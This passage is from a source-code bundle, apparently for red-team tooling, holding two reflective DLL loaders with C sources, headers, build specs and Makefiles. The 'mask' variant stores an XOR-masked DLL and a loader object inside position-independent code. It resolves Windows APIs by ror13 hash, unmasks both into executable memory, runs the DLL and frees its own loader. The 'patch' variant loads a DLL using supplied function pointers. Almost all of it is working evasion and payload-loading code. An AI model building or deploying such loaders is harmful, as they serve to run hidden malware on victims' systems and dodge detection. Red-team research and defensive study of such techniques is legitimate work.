 * utility functions
 */
DWORD adler32sum(unsigned char * buffer, DWORD length);
DWORD ror13hash(const char * c);

/*
 * printf-style debugging.
 */
void dprintf(char * format, ...);

/*
 * PICO running functions
 */
typedef void (*PICOMAIN_FUNC)(char * arg);

PICOMAIN_FUNC PicoGetExport(char * src, char * base, int tag);
PICOMAIN_FUNC PicoEntryPoint(char * src, char * base);
int PicoCodeSize(char * src);
int PicoDataSize(char * src);
void PicoLoad(IMPORTFUNCS * funcs, char * src, char * dstCode, char * dstData);
_RESOURCE * PicoGetUnwindData(char * src, char * base);

/*
 * Resolve functions by walking the export address table
 */
FARPROC findFunctionByHash(HANDLE hModule, DWORD wantedFunctionHash);
HANDLE findModuleByHash(DWORD moduleHash);

/*
 * DLL parsing and loading functions
 */
typedef BOOL WINAPI (*DLLMAIN_FUNC)(HINSTANCE, DWORD, LPVOID);

DLLMAIN_FUNC EntryPoint(DLLDATA * dll, void * base);
IMAGE_DATA_DIRECTORY * GetDataDirectory(DLLDATA * dll, UINT entry);
void LoadDLL(DLLDATA * dll, char * src, char * dst);
void LoadSections(DLLDATA * dll, char * src, char * dst);
void ParseDLL(char * src, DLLDATA * data);
void ProcessImports(IMPORTFUNCS * funcs, DLLDATA * dll, char * dst);
void ProcessRelocations(DLLDATA * dll, char * src, char * dst);
DWORD SizeOfDLL(DLLDATA * data);

/*
 * A macro to figure out our caller
 * https://github.com/rapid7/ReflectiveDLLInjection/blob/81cde88bebaa9fe782391712518903b5923470fb/dll/src/ReflectiveLoader.c#L34C1-L46C1
 */
#ifdef __MINGW32__
#define WIN_GET_CALLER() __builtin_extract_return_addr(__builtin_return_address(0))
#else
#pragma intrinsic(_ReturnAddress)
#define WIN_GET_CALLER() _ReturnAddress()
#endif

```

## File: simple_rdll_mask/LICENSE.txt

```text
Copyright 2025-2026 Adversary Fan Fiction Writers Guild

Redistribution and use in source and binary forms, with or without modification, are
permitted provided that the following conditions are met:

1. Redistributions of source code must retain the above copyright notice, this list of
conditions and the following disclaimer.

2. Redistributions in binary form must reproduce the above copyright notice, this list of
conditions and the following disclaimer in the documentation and/or other materials provided
with the distribution.

3. Neither the name of the copyright holder nor the names of its contributors may be used to
endorse or promote products derived from this software without specific prior written
permission.

THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS “AS IS” AND ANY EXPRESS
OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF
MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE
COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,
EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR
TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE,
EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

Copyright (c) 2011, Stephen Fewer of Harmony Security (www.harmonysecurity.com)
All rights reserved.
 
Redistribution and use in source and binary forms, with or without modification, are permitted 
provided that the following conditions are met:
 
    * Redistributions of source code must retain the above copyright notice, this list of 
conditions and the following disclaimer.
 
    * Redistributions in binary form must reproduce the above copyright notice, this list of 
conditions and the following disclaimer in the documentation and/or other materials provided 
with the distribution.
 
    * Neither the name of Harmony Security nor the names of its contributors may be used to
endorse or promote products derived from this software without specific prior written permission.
 
THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS OR 
IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND
FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR 
CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR 
CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR 
SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY 
THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR 
OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE 
POSSIBILITY OF SUCH DAMAGE.

```

## File: simple_rdll_mask/loader.spec

```text
#
# Simple Reflective DLL build spec
#
x86:
	# generate an 8KB XOR key, why not
	generate $KEY 8192

	# load our x86 .o file AND turn it into position-independent code
	load "bin/loader.x86.o"
		# +gofirst moves go() to position 0 of our PIC
		make pic +gofirst

		# OPT into x86 program fixes to allow data references without code hacks
		fixptrs "_caller"

		# OPT into PIC dynamic function resolution
		dfr "_resolve" "ror13"

		# merge the Tradecraft Garden Library into our PIC
		mergelib "../libtcg/libtcg.x86.zip"

		# load our Reflective DLL argument AND link it into our PIC as my_data section
		push $DLL
			mask "xor" $KEY
			preplen
			link "my_data"

		# load our XOR key and link it in as my_key
		push $KEY
			preplen
			link "my_key"

		# load our free() PICO
		load "bin/free.x86.o"
			make object
			export
			mask "xor" $KEY
			preplen
			link "my_bof"

	# we're done, export the final blob
	export

x64:
	generate $KEY 8192

	load "bin/loader.x64.o"
		make pic +gofirst

		dfr "resolve" "ror13"
		mergelib "../libtcg/libtcg.x64.zip"

		push $DLL
			mask "xor" $KEY
			preplen
			link "my_data"

		push $KEY
			preplen
			link "my_key"

		load "bin/free.x64.o"
			make object
			export
			mask "xor" $KEY
			preplen
			link "my_bof"
	
	export

```

## File: simple_rdll_mask/Makefile

```text
CC=i686-w64-mingw32-gcc
CC_64=x86_64-w64-mingw32-gcc
CFLAGS=-O1 -fno-jump-tables -shared -Wall -Wno-pointer-arith

.PHONY: all x86 x64 clean

all: x86 x64

bin:
	mkdir -p bin

x86: bin
	$(CC) -DWIN_X86 $(CFLAGS) -c src/loader.c -o bin/loader.x86.o
	$(CC) -DWIN_X86 $(CFLAGS) -c src/free.c -o bin/free.x86.o

x64: bin
	$(CC_64) -DWIN_X64 $(CFLAGS) -c src/loader.c -o bin/loader.x64.o
	$(CC_64) -DWIN_X64 $(CFLAGS) -c src/free.c -o bin/free.x64.o

clean:
	rm -rf bin

```

## File: simple_rdll_mask/src/free.c

```c
/*
 * Copyright 2025-2026 Adversary Fan Fiction Writers Guild
 *
 * Redistribution and use in source and binary forms, with or without modification, are
 * permitted provided that the following conditions are met:
 *
 * 1. Redistributions of source code must retain the above copyright notice, this list of
 * conditions and the following disclaimer.
 *
 * 2. Redistributions in binary form must reproduce the above copyright notice, this list of
 * conditions and the following disclaimer in the documentation and/or other materials provided
 * with the distribution.
 *
 * 3. Neither the name of the copyright holder nor the names of its contributors may be used to
 * endorse or promote products derived from this software without specific prior written
 * permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS “AS IS” AND ANY EXPRESS
 * OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF
 * MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE
 * COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,
 * EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
 * SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR
 * TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE,
 * EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */

#include <windows.h>

WINBASEAPI DECLSPEC_NORETURN VOID WINAPI KERNEL32$ExitThread (DWORD dwExitCode);
WINBASEAPI WINBOOL WINAPI KERNEL32$VirtualFree (LPVOID lpAddress, SIZE_T dwSize, DWORD dwFreeType);

typedef BOOL WINAPI (*DLLMAIN_FUNC)(HINSTANCE, DWORD, LPVOID);

void go(char * loader, char * dllEntry, char * dllBase) {
	/* free our loader */
	KERNEL32$VirtualFree(loader, 0, MEM_RELEASE);

	/* call the entry point of our Reflective DLL */
	((DLLMAIN_FUNC)dllEntry)((HINSTANCE)dllBase, DLL_PROCESS_ATTACH, NULL);

	/* exit the current thread.. else... we return to our free'd() memory and we don't want that. */
	KERNEL32$ExitThread(0);
}

```

## File: simple_rdll_mask/src/loader.c

```c
/*
 * Copyright 2025-2026 Adversary Fan Fiction Writers Guild
 *
 * Redistribution and use in source and binary forms, with or without modification, are
 * permitted provided that the following conditions are met:
 *
 * 1. Redistributions of source code must retain the above copyright notice, this list of
 * conditions and the following disclaimer.
 *
 * 2. Redistributions in binary form must reproduce the above copyright notice, this list of
 * conditions and the following disclaimer in the documentation and/or other materials provided
 * with the distribution.
 *
 * 3. Neither the name of the copyright holder nor the names of its contributors may be used to
 * endorse or promote products derived from this software without specific prior written
 * permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS “AS IS” AND ANY EXPRESS
 * OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF
 * MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE
 * COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,
 * EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
 * SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR
 * TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE,
 * EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */

#include <windows.h>
#include "tcg.h"

WINBASEAPI LPVOID WINAPI KERNEL32$VirtualAlloc (LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
WINBASEAPI WINBOOL WINAPI KERNEL32$VirtualFree (LPVOID lpAddress, SIZE_T dwSize, DWORD dwFreeType);

/*
 * This is our opt-in Dynamic Function Resolution resolver. It turns MODULE$Function into pointers.
 * See dfr "resolve" in loader.spec
 */
FARPROC resolve(DWORD modHash, DWORD funcHash) {
	HANDLE hModule = findModuleByHash(modHash);
	return findFunctionByHash(hModule, funcHash);
}

/*
 * This is our opt-in function to help fix ptrs in x86 PIC. See fixptrs _caller" in loader.spec
 */
#ifdef WIN_X86
__declspec(noinline) ULONG_PTR caller( VOID ) { return (ULONG_PTR)WIN_GET_CALLER(); }
#endif

/*
 * This is the Crystal Palace convention for getting ahold of data linked with this loader.
 */
char __DLLDATA__[0] __attribute__((section("my_data")));
char __BOFDATA__[0] __attribute__((section("my_bof")));
char __KEYDATA__[0] __attribute__((section("my_key")));

char * findAppendedDLL() {
	return (char *)&__DLLDATA__;
}

char * findAppendedPICO() {
	return (char *)&__BOFDATA__;
}

char * findAppendedKey() {
	return (char *)&__KEYDATA__;
}

/*
 * Our embedded resources are masked, so we need to unmask them.
 */
char * unmask(char * srcData) {
	_RESOURCE * key;
	_RESOURCE * src;
	char      * dst;

	/* parse our preplen + xor'd $KEY and our masked data too */
	key = (_RESOURCE *)findAppendedKey();
	src = (_RESOURCE *)srcData;

	/* allocate memory for our unmasked content */
	dst = KERNEL32$VirtualAlloc( NULL, src->length, MEM_RESERVE|MEM_COMMIT, PAGE_READWRITE );
	dprintf("ALLOC %p (%d bytes)", dst, src->length);

	/* unmask it */
	for (int x = 0; x < src->length; x++) {
		dst[x] = src->value[x] ^ key->value[x % key->length];
	}

	return dst;
}

/*
 * Get the start address of our PIC DLL loader.
 */
void go();

char * getStart() {
	return (char *)go;
}

/*
 * Our PICO loader, have fun, go nuts!
 */
typedef void (*PICOMAIN_FUNC_3)(char * loader, char * dllEntry, char * dllBase);

void RunViaFreeCOFF(IMPORTFUNCS * funcs, char * dllEntry, char *dllBase) {
	char        * dstCode;
	char        * dstData;
	char        * src = findAppendedPICO();
	char        * entry;

	/* unmask our PICO! */
	src = unmask(src);

	/* allocate memory for our PICO */
	dstData = KERNEL32$VirtualAlloc( NULL, PicoDataSize(src), MEM_RESERVE|MEM_COMMIT|MEM_TOP_DOWN, PAGE_READWRITE );
	dstCode = KERNEL32$VirtualAlloc( NULL, PicoCodeSize(src), MEM_RESERVE|MEM_COMMIT|MEM_TOP_DOWN, PAGE_EXECUTE_READWRITE );

	/* load our pico into our destination address, thanks! */
	PicoLoad(funcs, src, dstCode, dstData);

	/* grab our entry point, the last thing we need from our unmasked PICO */
	entry = (char *)PicoEntryPoint(src, dstCode);

	/* now that our pico is loaded, let's free the buffer with the unmasked PICO content */
	dprintf("free %p", src);
	KERNEL32$VirtualFree( src, 0, MEM_RELEASE );

	/* execute our pico */
	((PICOMAIN_FUNC_3)entry) ((char *)getStart(), dllEntry, dllBase);
}

/*
 * Our reflective loader itself, have fun, go nuts!
 */
void go() {
	char       * dst;
	char       * src;
	DLLDATA      data;
	IMPORTFUNCS  funcs;

	/* find our DLL appended to this PIC */
	src = findAppendedDLL();

	/* unmask our DLL data */
	src = unmask(src);

	/* parse our DLL! */
	ParseDLL(src, &data);

	/* allocate memory for it! */
	dst = KERNEL32$VirtualAlloc( NULL, SizeOfDLL(&data), MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE );

	/* load the damned thing */
	LoadDLL(&data, src, dst);

	/* setup our IMPORTFUNCS data structure */
	funcs.GetProcAddress = GetProcAddress;
	funcs.LoadLibraryA   = LoadLibraryA;

	/* process the imports */
	ProcessImports(&funcs, &data, dst);

	/* pass to our BOF */
	RunViaFreeCOFF(&funcs, (char *)EntryPoint(&data, dst), dst);
}

```

## File: simple_rdll_mask/src/tcg.h

```h
/*
 * Copyright 2025-2026 Adversary Fan Fiction Writers Guild
 *
 * Redistribution and use in source and binary forms, with or without modification, are
 * permitted provided that the following conditions are met:
 *
 * 1. Redistributions of source code must retain the above copyright notice, this list of
 * conditions and the following disclaimer.
 *
 * 2. Redistributions in binary form must reproduce the above copyright notice, this list of
 * conditions and the following disclaimer in the documentation and/or other materials provided
 * with the distribution.
 *
 * 3. Neither the name of the copyright holder nor the names of its contributors may be used to
 * endorse or promote products derived from this software without specific prior written
 * permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS
 * OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF
 * MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE
 * COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,
 * EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
 * SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR
 * TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE,
 * EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */

// linker intrinsic for __transfer (x64 only)
#ifdef WIN_X64
typedef void (* TRANSFERFUNC)();
void __transfer(TRANSFERFUNC func) __attribute__((noreturn));
#endif

// used by both the Pico Loader and DLL loader
typedef struct {
	__typeof__(LoadLibraryA)   * LoadLibraryA;
	__typeof__(GetProcAddress) * GetProcAddress;
} IMPORTFUNCS;

// used throughout TCG and useful for parsing preplen'd content
typedef struct {
        int   length;
        char  value[];
} _RESOURCE;

// linker intrinsic to map a function hash to a hook registered via Crystal Palace
FARPROC __resolve_hook(DWORD funcHash);

/*
 * Structs used by our DLL loader
 */

#define PTR_OFFSET(x, y) ( (void *)(x) + (ULONG)(y) )
#define DEREF( name )*(UINT_PTR *)(name)

typedef struct {
	IMAGE_DOS_HEADER      * DosHeader;
	IMAGE_NT_HEADERS      * NtHeaders;
	IMAGE_OPTIONAL_HEADER * OptionalHeader;
} DLLDATA;

/*
 * utility functions
 */
DWORD adler32sum(unsigned char * buffer, DWORD length);
DWORD ror13hash(const char * c);

/*
 * printf-style debugging.
 */
void dprintf(char * format, ...);

/*
 * PICO running functions
 */
typedef void (*PICOMAIN_FUNC)(char * arg);

PICOMAIN_FUNC PicoGetExport(char * src, char * base, int tag);
PICOMAIN_FUNC PicoEntryPoint(char * src, char * base);
int PicoCodeSize(char * src);
int PicoDataSize(char * src);
void PicoLoad(IMPORTFUNCS * funcs, char * src, char * dstCode, char * dstData);
_RESOURCE * PicoGetUnwindData(char * src, char * base);

/*
 * Resolve functions by walking the export address table
 */
FARPROC findFunctionByHash(HANDLE hModule, DWORD wantedFunctionHash);
HANDLE findModuleByHash(DWORD moduleHash);

/*
 * DLL parsing and loading functions
 */
typedef BOOL WINAPI (*DLLMAIN_FUNC)(HINSTANCE, DWORD, LPVOID);

DLLMAIN_FUNC EntryPoint(DLLDATA * dll, void * base);
IMAGE_DATA_DIRECTORY * GetDataDirectory(DLLDATA * dll, UINT entry);
void LoadDLL(DLLDATA * dll, char * src, char * dst);
void LoadSections(DLLDATA * dll, char * src, char * dst);
void ParseDLL(char * src, DLLDATA * data);
void ProcessImports(IMPORTFUNCS * funcs, DLLDATA * dll, char * dst);
void ProcessRelocations(DLLDATA * dll, char * src, char * dst);
DWORD SizeOfDLL(DLLDATA * data);

/*
 * A macro to figure out our caller
 * https://github.com/rapid7/ReflectiveDLLInjection/blob/81cde88bebaa9fe782391712518903b5923470fb/dll/src/ReflectiveLoader.c#L34C1-L46C1
 */
#ifdef __MINGW32__
#define WIN_GET_CALLER() __builtin_extract_return_addr(__builtin_return_address(0))
#else
#pragma intrinsic(_ReturnAddress)
#define WIN_GET_CALLER() _ReturnAddress()
#endif

```

## File: simple_rdll_patch/LICENSE.txt

```text
Copyright 2025-2026 Adversary Fan Fiction Writers Guild

Redistribution and use in source and binary forms, with or without modification, are
permitted provided that the following conditions are met:

1. Redistributions of source code must retain the above copyright notice, this list of
conditions and the following disclaimer.

2. Redistributions in binary form must reproduce the above copyright notice, this list of
conditions and the following disclaimer in the documentation and/or other materials provided
with the distribution.

3. Neither the name of the copyright holder nor the names of its contributors may be used to
endorse or promote products derived from this software without specific prior written
permission.

THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS “AS IS” AND ANY EXPRESS
OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF
MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE
COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,
EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR
TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE,
EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

Copyright (c) 2011, Stephen Fewer of Harmony Security (www.harmonysecurity.com)
All rights reserved.
 
Redistribution and use in source and binary forms, with or without modification, are permitted 
provided that the following conditions are met:
 
    * Redistributions of source code must retain the above copyright notice, this list of 
conditions and the following disclaimer.
 
    * Redistributions in binary form must reproduce the above copyright notice, this list of 
conditions and the following disclaimer in the documentation and/or other materials provided 
with the distribution.
 
    * Neither the name of Harmony Security nor the names of its contributors may be used to
endorse or promote products derived from this software without specific prior written permission.
 
THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS OR 
IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND
FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR 
CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR 
CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR 
SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY 
THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR 
OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE 
POSSIBILITY OF SUCH DAMAGE.

```

## File: simple_rdll_patch/loader.spec

```text
name     "Simple Loader (Pointer Patching)"
describe "Simple Loader that bootstraps with user-provided GetModuleHandle and GetProcAddress pointers"
author   "Adversary Fan Fiction Writers Guild"
license  "BSD"
reference "https://tradecraftgarden.org/simplepatch.html"

defraw   "$DLL" "DLL capability"
defraw   "$GMH" "GetModuleHandle pointer"
defraw   "$GPA" "GetProcAddress pointer"

x86:
	# load our x86 .o file AND turn it into position-independent code
	load "bin/loader.x86.o"
		# +gofirst moves go() to position 0 of our PIC
		make pic +gofirst +optimize

		# OPT into x86 program fixes to allow data references without code hacks
		fixptrs "_caller"

		# patch symbols that we located into the .text section
		# $GMH is GetModuleHandle, $GPA is GetProcAddress
		patch "_pGetModuleHandle" $GMH
		patch "_pGetProcAddress"  $GPA

		# OPT into PIC dynamic function resolution.
		#
		# Note that we're using the strings method and not ror13. This is because we have
		# our GetModuleHandle and GetProcAddress pointers to work with.
		dfr "_resolve" "strings"

		# merge the Tradecraft Garden Library into our PIC
		mergelib "../libtcg/libtcg.x86.zip"

		# load our DLL argument AND link it into our PIC as my_data section
		push $DLL
			link "my_data"

		# we're done, export the final blob
		export

x64:
	load "bin/loader.x64.o"
		make pic +gofirst +optimize

		patch "pGetModuleHandle" $GMH
		patch "pGetProcAddress"  $GPA

		dfr "resolve" "strings"
		mergelib "../libtcg/libtcg.x64.zip"

		push $DLL
			link "my_data"

		export

```

## File: simple_rdll_patch/Makefile

```text
CC=i686-w64-mingw32-gcc
CC_64=x86_64-w64-mingw32-gcc
CFLAGS=-O1 -fno-jump-tables -shared -Wall -Wno-pointer-arith

.PHONY: all x86 x64 clean

all: x86 x64

bin:
	mkdir -p bin

x86: bin
	$(CC) -DWIN_X86 $(CFLAGS) -c src/loader.c -o bin/loader.x86.o

x64: bin
	$(CC_64) -DWIN_X64 $(CFLAGS) -c src/loader.c -o bin/loader.x64.o

clean:
	rm -rf bin

```

## File: simple_rdll_patch/src/loader.c

```c
/*
 * Copyright 2025-2026 Adversary Fan Fiction Writers Guild
 *
 * Redistribution and use in source and binary forms, with or without modification, are
 * permitted provided that the following conditions are met:
 *
 * 1. Redistributions of source code must retain the above copyright notice, this list of
 * conditions and the following disclaimer.
 *
 * 2. Redistributions in binary form must reproduce the above copyright notice, this list of
 * conditions and the following disclaimer in the documentation and/or other materials provided
 * with the distribution.
 *
 * 3. Neither the name of the copyright holder nor the names of its contributors may be used to
 * endorse or promote products derived from this software without specific prior written
 * permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS “AS IS” AND ANY EXPRESS
 * OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF
 * MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE
 * COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,
 * EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
 * SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR
 * TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE,
 * EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */

#include <windows.h>
#include "tcg.h"

WINBASEAPI LPVOID WINAPI KERNEL32$VirtualAlloc (LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);

/*
 * Here's how to pull in function pointers, linked from the .spec file, and use them
 */
__typeof__(GetModuleHandle) * pGetModuleHandle __attribute__((section(".text")));
__typeof__(GetProcAddress)  * pGetProcAddress  __attribute__((section(".text")));

/*
 * This is our opt-in Dynamic Function Resolution resolver. It turns MODULE$Function into pointers.
 * dfr "resolve" "strings" in loader.spec is how our program knows about this function. Note that we're getting
 * string arguments because of the "strings" method. These strings live on the stack.
 */
FARPROC resolve(char * module, char * function) {
	HANDLE hModule = pGetModuleHandle(module);
	return pGetProcAddress(hModule, function);
}

/*
 * This is our opt-in function to help fix ptrs in x86 PIC. See fixptrs _caller" in loader.spec
 */
#ifdef WIN_X86
__declspec(noinline) ULONG_PTR caller( VOID ) { return (ULONG_PTR)WIN_GET_CALLER(); }
#endif

/*
 * This is the Crystal Palace convention for getting ahold of data linked with this loader.
 */
char __DLLDATA__[0] __attribute__((section("my_data")));

char * findAppendedDLL() {
	return (char *)&__DLLDATA__;
}

/*
 * Our reflective loader itself, have fun, go nuts!
 */
void go() {
	char       * dst;
	char       * src;
	DLLDATA      data;
	IMPORTFUNCS  funcs;

	/* find our DLL appended to this PIC */
	src = findAppendedDLL();

	/* parse our DLL! */
	ParseDLL(src, &data);

	/* allocate memory for it! */
	dst = KERNEL32$VirtualAlloc( NULL, SizeOfDLL(&data), MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE );

	/* load the damned thing */
	LoadDLL(&data, src, dst);

	/* setup our IMPORTFUNCS data structure */
	funcs.GetProcAddress = GetProcAddress;
	funcs.LoadLibraryA   = LoadLibraryA;

	/* process the imports */
	ProcessImports(&funcs, &data, dst);

	/* pass execution to our DLL */
	EntryPoint(&data, dst)((HINSTANCE)dst, DLL_PROCESS_ATTACH, NULL);
}

```

## File: simple_rdll_patch/src/tcg.h

```h
/*
 * Copyright 2025-2026 Adversary Fan Fiction Writers Guild
 *
 * Redistribution and use in source and binary forms, with or without modification, are
 * permitted provided that the following conditions are met:
 *
 * 1. Redistributions of source code must retain the above copyright notice, this list of
 * conditions and the following disclaimer.
 *
 * 2. Redistributions in binary form must reproduce the above copyright notice, this list of
 * conditions and the following disclaimer in the documentation and/or other materials provided
 * with the distribution.
 *
 * 3. Neither the name of the copyright holder nor the names of its contributors may be used to
 * endorse or promote products derived from this software without specific prior written
 * permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS
 * OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF
 * MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE
 * COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,
 * EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
 * SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR
 * TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE,
 * EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */

// linker intrinsic for __transfer (x64 only)
#ifdef WIN_X64
typedef void (* TRANSFERFUNC)();
void __transfer(TRANSFERFUNC func) __attribute__((noreturn));
#endif

// used by both the Pico Loader and DLL loader
typedef struct {
	__typeof__(LoadLibraryA)   * LoadLibraryA;
	__typeof__(GetProcAddress) * GetProcAddress;
